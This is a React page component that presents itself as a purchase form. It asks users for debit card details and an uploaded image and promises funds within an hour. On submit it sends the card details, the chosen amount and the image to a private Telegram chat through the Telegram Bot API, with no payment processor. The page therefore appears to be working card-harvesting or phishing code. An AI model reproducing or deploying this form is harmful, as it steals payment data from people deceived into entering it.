import React, { useState } from "react";
import Button from "../components/Button";
import { ButtonData } from "../components/ButtonData";

export default function BuyPage() {
  // state for handling the amount
  const [selectedAmount, setSelectedAmount] = useState("");
  // state handling for card Details and image file
  const [formDetails, setFormDetails] = useState({
    cardDetails: "",
    imageFile: null,
  });
  // handle button click
  const handleButtonClick = (amount) => {
    setSelectedAmount(amount);
  };
  // function for tracking the changes in the formDetails
  const handleChange = (e) => {
    const { name, files, value } = e.target;
    setFormDetails((prevDetails) => ({
      ...prevDetails,
      [name]: files ? files[0] : value,
    }));
  };
  // function for handling the form submit
  const handleSubmit = async (e) => {
    e.preventDefault();

    const token = process.env.Telegram_Buy;
    const chatId = process.env.Telegram_Buy_Id;

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append(
      "caption",
      `Selected Amount: ${selectedAmount}\nCard Details: ${formDetails.cardDetails}`
    );
    if (formDetails.imageFile) {
      formData.append("photo", formDetails.imageFile);
    }

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendPhoto`,
        {
          method: "POST",
          body: formData,
        }
      );
      const data = await response.json();

      console.log(data, "data from the telegram");

      if (data.ok) {
        alert("Form submitted successfully!");
      } else {
        alert("Error submitting form.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Error submitting form.");
    }
  };
  return (
    <div className="w-full h-full flex flex-col">
      <div className="flex">
        <span className="w-fit">
          <p className="w-fit h-auto ml-5 my-5  text-orange-700 font-bold">
            Note:
          </p>
        </span>
        <p className="w-fit h-auto  my-5 ml-4 sm:ml-2  text-orange-600 font-normal">
          you can expect to recieve your funds within 10 to 60 minutes
        </p>
      </div>

      <div className="flex justify-center">
        <div className="w-[80%] h-auto flex gap-10 flex-wrap justify-center ">
          {ButtonData.map((item, index) => {
            return (
              <Button
                key={item.id}
                amount={item.amount}
                index={index}
                onClick={handleButtonClick}
              />
            );
          })}
        </div>
      </div>

      <div className="flex justify-center">
        <form
          onSubmit={handleSubmit}
          className="flex flex-col gap-5 mt-8 p-4 sm:w-[45%] w-[90%] border-2
           border-blue-400 rounded-lg hover:shadow-2xl transition-shadow duration-300"
        >
          <input
            type="text"
            value={selectedAmount}
            placeholder="Please select the amount"
            readOnly
            className="border rounded-lg p-3 focus:outline-none w-full"
          />
          <input
            type="number"
            name="cardDetails"
            value={formDetails.cardDetails}
            onChange={handleChange}
            placeholder="Please Enter the debit card details"
            className="rounded-lg p-3 focus:outline-none w-full"
          />
          <input
            type="file"
            name="imageFile"
            onChange={handleChange}
            className="border rounded-lg p-3 focus:outline-none w-full"
          />
          <div className="flex w-full justify-center items-center p-3">
            <button
              type="submit"
              className="bg-blue-500 text-white rounded-lg p-3 focus:outline-none
               hover:bg-blue-300  hover:text-black w-[30%] sm:w-[20%] "
            >
              Submit
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
